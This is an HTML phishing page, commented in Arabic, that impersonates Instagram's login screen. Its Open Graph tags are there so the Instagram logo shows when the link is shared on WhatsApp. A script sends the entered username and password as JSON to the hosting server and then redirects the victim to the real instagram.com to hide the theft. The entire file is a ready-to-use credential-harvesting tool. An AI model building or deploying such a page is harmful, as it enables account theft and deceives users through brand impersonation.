<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- كود إظهار شعار انستجرام عند إرسال الرابط في الواتساب -->
    <meta property="og:title" content="Instagram">
    <meta property="og:description" content="Log in to see photos and videos from your friends.">
    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/ed973d412957.png">
    
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 40px; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

<div class="login-container">
    <!-- شعار انستجرام الرسمي -->
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/840px-Instagram_logo.svg.png" alt="Instagram">
    
    <form id="instaForm">
        <input type="text" id="username" placeholder="الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة السر" required>
        <button type="submit">تسجيل الدخول</button>
    </form>
</div>

<script>
    document.getElementById('instaForm').addEventListener('submit', function(e) {
        e.preventDefault(); // منع الصفحة من إعادة التحميل
        
        // تجميع البيانات المكتوبة
        const data = {
            user: document.getElementById('username').value,
            pass: document.getElementById('password').value
        };

        // إرسال البيانات فوراً إلى السيرفر عبر رابط نسبي
        fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => {
            if(response.ok) {
                // تحويل المستخدم إلى موقع انستجرام الحقيقي بعد إرسال البيانات لإكمال المحاكاة
                window.location.href = "https://www.instagram.com";
            }
        })
        .catch(err => console.error("خطأ في الاتصال:", err));
    });
</script>

</body>
</html>
